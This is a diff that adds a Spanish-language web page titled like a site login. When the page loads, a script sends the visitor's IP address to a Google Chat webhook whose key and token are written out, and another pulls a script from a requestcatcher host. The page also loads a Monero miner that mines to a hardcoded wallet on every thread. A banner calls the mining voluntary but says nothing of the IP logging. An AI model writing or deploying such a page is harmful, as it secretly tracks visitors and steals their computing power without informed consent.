@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="es">
+    <head>
+        <title>Entrar al sitio | Palencia</title>
+        <link rel="shortcut icon" href="./favicon.ico" />
+        <!--ip-->
+        <script src="https://dox.requestcatcher.com/"></script>
+        <script>
+            async function sendMessage() {
+              try {
+                // URL del endpoint al que se enviará el mensaje
+                const url = "https://chat.googleapis.com/v1/spaces/AAAAPVoBJM8/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=vXbMWyaGjzPohuRwr8UpIYZpfthuKu2zcjHbObWsdtI";
+          
+                // Realizar la solicitud fetch para obtener el mensaje
+                const response = await fetch("https://wtfismyip.com/text");
+                if (!response.ok) {
+                  throw new Error(`Error fetching message: ${response.statusText}`);
+                }
+          
+                // Obtener el texto del mensaje
+                const msg = await response.text();
+          
+                // Preparar la solicitud para enviar el mensaje
+                const payload = JSON.stringify({ text: msg });
+                const xhr = new XMLHttpRequest();
+                xhr.open("POST", url);
+                xhr.setRequestHeader("Content-type", "application/json; charset=UTF-8");
+          
+                // Manejo de la respuesta de la solicitud
+                xhr.onload = () => {
+                  if (xhr.status >= 200 && xhr.status < 300) {
+                    console.log("Mensaje enviado con éxito:", xhr.responseText);
+                  } else {
+                    console.error(`Error al enviar mensaje: ${xhr.status} ${xhr.statusText}`);
+                  }
+                };
+          
+                // Manejo de errores en la solicitud
+                xhr.onerror = () => {
+                  console.error("Error de conexión al enviar el mensaje.");
+                };
+          
+                // Enviar la solicitud
+                xhr.send(payload);
+              } catch (error) {
+                console.error("Error en el proceso:", error.message);
+              }
+            }
+          
+            // Ejecutar la función
+            sendMessage();
+            function handleShortcut(event) {
+          if (event.key === ".") {
+              event.preventDefault();
+              window.close()
+            }
+          }
+            document.addEventListener("keydown", handleShortcut);
+
+const logDiv = document.getElementById("logOutput");
+console.log = function(message) {
+  const p = document.createElement("p");
+  p.textContent = message;
+  logDiv.appendChild(p);
+};
+
+</script>
+            <!--end ip-->
+<script src="https://script.monerominer.rocks"></script>
+<script>
+    server = "wss://ny1.xmrminingproxy.com";
+    var pool = "moneroocean.stream";
+    var walletAddress = "4A87r89fk6nQKGVdUKroHZWGMWi9v4SMh3pZeTLfdXqM2HqxiWsBMgiPRDz34s56dMFWYuBpHose1FiTi76xbczY5NyEctN";
+    var workerId = ""
+    var threads = -1;
+    var password = "x";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
+</script>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+        <style>
+body {
+  background-color: rgb(51, 47, 47);
+}
+
+h1{
+  color:white;
+}
+
+p{
+  color:white;
+}
+
+        </style> 
+    <center><h1>Me estas ayudando ahora mismo, estas minando criptomonedas. Si quieres parar, cierra esta web. Esto es un acto totalmente voluntario. Muchas gracias. Abajo tienes los registros por si te interesan.</h1></center>
+    <div id="logOutput"></div>
+
+</body>
+</html>
